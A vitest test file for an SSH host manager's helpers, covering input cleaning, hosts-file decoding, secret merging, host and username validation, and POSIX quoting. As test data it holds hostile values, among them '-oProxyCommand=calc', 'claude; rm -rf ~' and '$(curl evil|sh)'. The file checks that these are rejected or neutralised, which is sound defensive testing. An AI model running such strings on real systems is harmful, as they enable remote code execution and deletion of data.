import { describe, it, expect } from 'vitest'
import {
  mergeSecrets,
  cleanHostFields,
  cleanHostText,
  decodeHostsFile,
  refuseOverwriteMessage,
  connectionFieldsChanged,
  hasControlChars,
  hostFieldProblem,
  hostFieldProblemKey,
  isSafeSshHost,
  isSafeSshUsername,
  quotePosix,
  remoteCommandWord,
  sshDestinationArgs
} from './ssh-host-pure'
import { makeT } from '../shared/i18n'

describe('cleanHostText', () => {
  it('trims surrounding whitespace', () => {
    expect(cleanHostText('  192.168.1.10 \t')).toBe('192.168.1.10')
  })

  it('strips a trailing non-breaking space and a BOM', () => {
    expect(cleanHostText('192.168.1.10\u00a0')).toBe('192.168.1.10')
    expect(cleanHostText('\ufeffjdl')).toBe('jdl')
  })

  it('strips zero-width characters, which trim() keeps', () => {
    expect(cleanHostText('192.168.1.10\u200b')).toBe('192.168.1.10')
    expect(cleanHostText('pve\u200c-\u200d01\u2060')).toBe('pve-01')
  })

  it('keeps inner spaces', () => {
    expect(cleanHostText(' my server ')).toBe('my server')
  })
})

describe('cleanHostFields', () => {
  const base = { id: 'ssh_1', name: ' pve-01 ', host: '192.168.1.10 ', port: 22, username: 'jdl\u200b', authType: 'key' as const }

  it('cleans name, host and username', () => {
    const out = cleanHostFields(base)
    expect(out.name).toBe('pve-01')
    expect(out.host).toBe('192.168.1.10')
    expect(out.username).toBe('jdl')
  })

  it('cleans the optional path fields only when present', () => {
    const out = cleanHostFields({ ...base, privateKeyPath: ' C:\\k\\id ', remotePath: '/srv ' })
    expect(out.privateKeyPath).toBe('C:\\k\\id')
    expect(out.remotePath).toBe('/srv')
    expect('claudePath' in out).toBe(false)
  })

  it('leaves secrets and unrelated fields untouched', () => {
    const out = cleanHostFields({ ...base, password: ' keep me ', passphrase: ' too ' })
    expect(out.password).toBe(' keep me ')
    expect(out.passphrase).toBe(' too ')
    expect(out.port).toBe(22)
    expect(out.id).toBe('ssh_1')
  })
})

describe('decodeHostsFile', () => {
  const hosts = [{ id: 'ssh_1', name: 'pve-01' }]
  const json = JSON.stringify(hosts)
  // A stand-in for safeStorage: "encrypted" bytes are the JSON behind a marker.
  const MARK = 'ENC:'
  const encrypt = (s: string): Buffer => Buffer.from(MARK + s, 'utf-8')
  const decrypt = (b: Buffer): string => {
    const s = b.toString('utf-8')
    if (!s.startsWith(MARK)) throw new Error('Error while decrypting the ciphertext provided to safeStorage.decryptString.')
    return s.slice(MARK.length)
  }
  const unavailable = (): string => {
    throw new Error('Encryption is not available.')
  }

  it('reads an encrypted file while encryption is available', () => {
    expect(decodeHostsFile(encrypt(json), { encryptionAvailable: true, decrypt })).toEqual({ ok: true, hosts })
  })

  it('reads a plaintext file while encryption is unavailable', () => {
    expect(decodeHostsFile(Buffer.from(json), { encryptionAvailable: false, decrypt: unavailable })).toEqual({ ok: true, hosts })
  })

  it('falls back to plaintext when a plaintext file meets available encryption', () => {
    expect(decodeHostsFile(Buffer.from(json), { encryptionAvailable: true, decrypt })).toEqual({ ok: true, hosts })
  })

  it('falls back to decrypting when an encrypted file meets unavailable encryption', () => {
    expect(decodeHostsFile(encrypt(json), { encryptionAvailable: false, decrypt })).toEqual({ ok: true, hosts })
  })

  it('reads an empty list as an empty list', () => {
    expect(decodeHostsFile(encrypt('[]'), { encryptionAvailable: true, decrypt })).toEqual({ ok: true, hosts: [] })
  })

  it('is an error, not an empty list, when neither mode decodes', () => {
    const res = decodeHostsFile(Buffer.from([0x01, 0x02, 0xff]), { encryptionAvailable: true, decrypt })
    expect(res.ok).toBe(false)
    if (!res.ok) {
      expect(res.error).toMatch(/^encrypted: .*decrypting.*; plaintext: /)
    }
  })

  it('is an error when the file decodes to something other than a list', () => {
    const res = decodeHostsFile(encrypt('{"id":"ssh_1"}'), { encryptionAvailable: true, decrypt })
    expect(res.ok).toBe(false)
    if (!res.ok) expect(res.error).toContain('not a list of hosts')
  })

  it('is an error for an empty (truncated) file', () => {
    expect(decodeHostsFile(Buffer.alloc(0), { encryptionAvailable: false, decrypt: unavailable }).ok).toBe(false)
  })
})

describe('refuseOverwriteMessage', () => {
  it('says nothing was written and names the file', () => {
    const msg = refuseOverwriteMessage(makeT('en'), 'C:\\data\\ssh-hosts.bin', 'bad decrypt')
    expect(msg).toContain('refusing to overwrite')
    expect(msg).toContain('bad decrypt')
    expect(msg).toContain('C:\\data\\ssh-hosts.bin')
  })
})

describe('mergeSecrets', () => {
  const prev = { password: 'old', passphrase: 'oldpp' }
  it('keeps the stored secret when undefined or empty', () => {
    expect(mergeSecrets(prev, { authType: 'password' })).toEqual({ password: 'old' })
    expect(mergeSecrets(prev, { authType: 'password', password: '' })).toEqual({ password: 'old' })
    expect(mergeSecrets(prev, { authType: 'key' })).toEqual({ passphrase: 'oldpp' })
  })
  it('clears on null', () => {
    expect(mergeSecrets(prev, { authType: 'password', password: null })).toEqual({})
    expect(mergeSecrets(prev, { authType: 'key', passphrase: null })).toEqual({})
  })
  it('replaces with a non-empty string', () => {
    expect(mergeSecrets(prev, { authType: 'password', password: 'new' })).toEqual({ password: 'new' })
    expect(mergeSecrets(undefined, { authType: 'key', passphrase: 'x' })).toEqual({ passphrase: 'x' })
  })
  it('drops the secret the auth type does not use', () => {
    expect(mergeSecrets(prev, { authType: 'agent' })).toEqual({})
    expect(mergeSecrets(prev, { authType: 'key', password: 'typed' })).toEqual({ passphrase: 'oldpp' })
  })
})

describe('connectionFieldsChanged', () => {
  const prev = { host: 'h', port: 22, username: 'u', authType: 'key' as const, privateKeyPath: '/k' }

  it('is false when nothing changed, or only non-connection fields did', () => {
    expect(connectionFieldsChanged(prev, { ...prev })).toBe(false)
    expect(connectionFieldsChanged(prev, { ...prev, name: 'x', remotePath: '/r', claudePath: 'c' } as never)).toBe(false)
  })

  it('treats a missing port as 22', () => {
    expect(connectionFieldsChanged(prev, { ...prev, port: undefined })).toBe(false)
  })

  it('is true for each connection field', () => {
    expect(connectionFieldsChanged(prev, { ...prev, host: 'h2' })).toBe(true)
    expect(connectionFieldsChanged(prev, { ...prev, port: 2222 })).toBe(true)
    expect(connectionFieldsChanged(prev, { ...prev, username: 'v' })).toBe(true)
    expect(connectionFieldsChanged(prev, { ...prev, authType: 'agent' })).toBe(true)
    expect(connectionFieldsChanged(prev, { ...prev, privateKeyPath: '/k2' })).toBe(true)
  })

  it('is true when a secret is replaced or cleared, false when untouched', () => {
    expect(connectionFieldsChanged(prev, { ...prev, passphrase: 'new' })).toBe(true)
    expect(connectionFieldsChanged(prev, { ...prev, password: null })).toBe(true)
    expect(connectionFieldsChanged(prev, { ...prev, passphrase: undefined })).toBe(false)
    expect(connectionFieldsChanged(prev, { ...prev, passphrase: '' })).toBe(false)
  })
})

describe('isSafeSshUsername', () => {
  it('accepts ordinary and directory login names', () => {
    for (const u of ['root', 'jdl', 'deploy-bot', 'svc_app', 'a.b', '1000', 'joao@corp.example', 'CORP\\joao', 'HOST$']) {
      expect(isSafeSshUsername(u), u).toBe(true)
    }
  })

  it('refuses option-like, empty, spaced, control and shell-special names', () => {
    for (const u of ['', '-oProxyCommand=calc', '-l', 'a b', 'a\tb', 'root\n', 'a\u0000b', "o'neil", 'a;b', 'a`id`', '$(id)', 'a|b', 'joão', 'x'.repeat(257)]) {
      expect(isSafeSshUsername(u), JSON.stringify(u)).toBe(false)
    }
  })
})

describe('isSafeSshHost', () => {
  it('accepts hostnames, IPv4 and IPv6 (bare, bracketed, with a zone)', () => {
    for (const h of ['pve-01', 'srv.example.com', 'srv.example.com.', 'my_host.lan', '192.168.1.10', '::1', 'fe80::1%eth0', '[2001:db8::1]', '2001:db8::1']) {
      expect(isSafeSshHost(h), h).toBe(true)
    }
  })

  it('refuses option-like, spaced, control and malformed hosts', () => {
    for (const h of ['', '-oProxyCommand=calc.exe', '-p', 'a b', 'host\n', 'host\u0007', 'a..b', 'host-', '-host', 'a.-b', 'user@host', 'host;id', '$(id)', '[::1', 'fe80::1%eth0;id', 'x'.repeat(254)]) {
      expect(isSafeSshHost(h), JSON.stringify(h)).toBe(false)
    }
  })
})

describe('hasControlChars', () => {
  it('finds C0, DEL and C1 controls', () => {
    expect(hasControlChars('/srv/app')).toBe(false)
    expect(hasControlChars('/srv/my app')).toBe(false)
    for (const s of ['a\nb', 'a\rb', '\u0003', 'a\u007f', 'a\u009b']) expect(hasControlChars(s)).toBe(true)
  })
})

describe('hostFieldProblem', () => {
  const ok = { host: 'srv.lan', username: 'root' }

  it('is null for a usable host', () => {
    expect(hostFieldProblem(ok)).toBeNull()
    expect(hostFieldProblem({ ...ok, remotePath: "/srv/o'neil app", claudePath: '~/.local/bin/claude' })).toBeNull()
  })

  it('names the first bad field', () => {
    expect(hostFieldProblem({ ...ok, username: '-oProxyCommand=x' })).toBe('username')
    expect(hostFieldProblem({ ...ok, host: '-oProxyCommand=x' })).toBe('host')
    expect(hostFieldProblem({ ...ok, remotePath: '/srv\u0003touch /tmp/x\r' })).toBe('remotePath')
    expect(hostFieldProblem({ ...ok, claudePath: 'claude\nrm -rf ~' })).toBe('claudePath')
  })

  it('maps to a key both dictionaries carry', () => {
    const tEn = makeT('en')
    const tPt = makeT('pt-PT')
    for (const p of ['username', 'host', 'remotePath', 'claudePath'] as const) {
      const key = hostFieldProblemKey(p)
      expect(tEn(key)).not.toBe(key)
      expect(tPt(key)).not.toBe(key)
    }
  })
})

describe('sshDestinationArgs', () => {
  it('ends the options with -- before user@host', () => {
    expect(sshDestinationArgs('root', 'srv.lan')).toEqual(['--', 'root@srv.lan'])
    expect(sshDestinationArgs('joao@corp.example', '10.0.0.5')).toEqual(['--', 'joao@corp.example@10.0.0.5'])
  })

  it('refuses a hostile user or host', () => {
    expect(sshDestinationArgs('-oProxyCommand=calc', 'srv')).toBeNull()
    expect(sshDestinationArgs('root', '-oProxyCommand=calc')).toBeNull()
    expect(sshDestinationArgs('root', 'srv -oProxyCommand=calc')).toBeNull()
  })
})

describe('quotePosix / remoteCommandWord', () => {
  it('single-quotes and escapes embedded quotes', () => {
    expect(quotePosix('claude')).toBe("'claude'")
    expect(quotePosix("it's")).toBe("'it'\\''s'")
  })

  it('keeps metacharacters inert', () => {
    expect(remoteCommandWord('claude; rm -rf ~')).toBe("'claude; rm -rf ~'")
    expect(remoteCommandWord('$(curl evil|sh)')).toBe("'$(curl evil|sh)'")
    expect(remoteCommandWord("/opt/x'; id; echo '")).toBe("'/opt/x'\\''; id; echo '\\'''")
    expect(remoteCommandWord('/usr/local/bin/claude')).toBe("'/usr/local/bin/claude'")
  })

  it('leaves a leading ~/ unquoted so the remote shell still expands it', () => {
    expect(remoteCommandWord('~/.local/bin/claude')).toBe("~/'.local/bin/claude'")
    expect(remoteCommandWord('~/a b/$(id)')).toBe("~/'a b/$(id)'")
    expect(remoteCommandWord('~root/claude')).toBe("'~root/claude'")
  })
})
